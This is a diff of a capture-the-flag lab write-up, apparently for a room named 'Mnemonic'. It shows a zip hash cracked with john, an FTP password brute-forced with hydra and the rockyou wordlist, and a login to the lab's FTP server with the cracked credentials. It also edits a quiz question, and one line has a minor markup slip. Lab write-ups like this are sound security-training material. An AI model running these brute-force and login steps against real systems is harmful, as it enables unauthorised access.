@@ -188,7 +188,7 @@ backups.zip/backups/note.txt:$pkzip2$1*2*2*0*43*3c*aee718a8*42*4a*8*43*aee7*24e2
 <br>
 
 <h3 align="center">$$\textcolor{white}{\textnormal{john X hash }}$$</h3>
-<p align="center"><code>note.txt</code></p>
+<p align="center"><code>00385007</code>code> --> <code>note.txt</code></p>
 
 <br>
 
@@ -214,7 +214,7 @@ note.txt
 <br>
 
 <h3 align="center">$$\textcolor{white}{\textnormal{cat X note.txt }}$$</h3>
-<p align="center"><code>ftp username</code></p>
+<p align="center"><code>ftp username</code> : <code>ftpuser</code></p>
 
 <br>
 
@@ -235,6 +235,13 @@ we have to work hard
 
 <br>
 
+<br>
+
+<h3 align="center">$$\textcolor{white}{\textnormal{hydra x ftpuser}}$$</h3>
+<p align="center"><code>ftpuser</code> : <code>love4ever</code></p>
+
+<br>
+
 ```bash
 :~/backups# hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://TargetIP
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -251,15 +258,21 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-10 03:05:
 
 <br>
 
-> 3.3. <em>ftp password?</em><a id='3.3'></a>
->> <code><strong>love4ever</strong></code><br>
+> 3.3. <em>What is the ssh username?</em><a id='3.3'></a>
+>> <code><strong>_____</strong></code><br>
+
+<br>
+
+<h3 align="center">$$\textcolor{white}{\textnormal{ftp --> ftpuser : love4ever}}$$</h3>
+<p align="center"><code>ftpuser</code> : <code>love4ever</code></p>
 
 <br>
 
 ```bash
-:~/backups# ftp TargetIP
-...
-Name (TargetIP:root): ftpuser
+~/Mnemonic# ftp 10.10.229.90
+Connected to 10.10.229.90.
+220 (vsFTPd 3.0.3)
+Name (10.10.229.90:root): ftpuser
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -286,7 +299,6 @@ drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
 drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
 226 Directory send OK.
 ftp> 
-
 
 ```
 
